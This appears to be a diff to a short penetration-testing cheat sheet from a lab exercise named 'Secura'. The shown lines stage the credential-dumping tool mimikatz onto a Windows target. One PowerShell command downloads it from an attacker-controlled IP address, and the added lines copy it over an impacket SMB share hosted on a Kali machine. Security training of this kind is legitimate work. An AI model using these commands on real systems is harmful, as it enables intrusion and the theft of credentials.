@@ -3,3 +3,11 @@ python3 -m http.server 80
 
 Powershell:
 Invoke-WebRequest -Uri http://192.168.45.180/Secura/mimikatz/x64/mimikatz.exe -OutFile C:\Users\Public\mimikatz64.exe
+
+
+sudo apt install impacket-scripts
+mkdir /tmp/share
+cp mimikatz.exe /tmp/share/
+sudo impacket-smbserver share /tmp/share
+
+copy \\<KALI-IP>\share\mimikatz.exe C:\Users\Public\mimikatz.exe
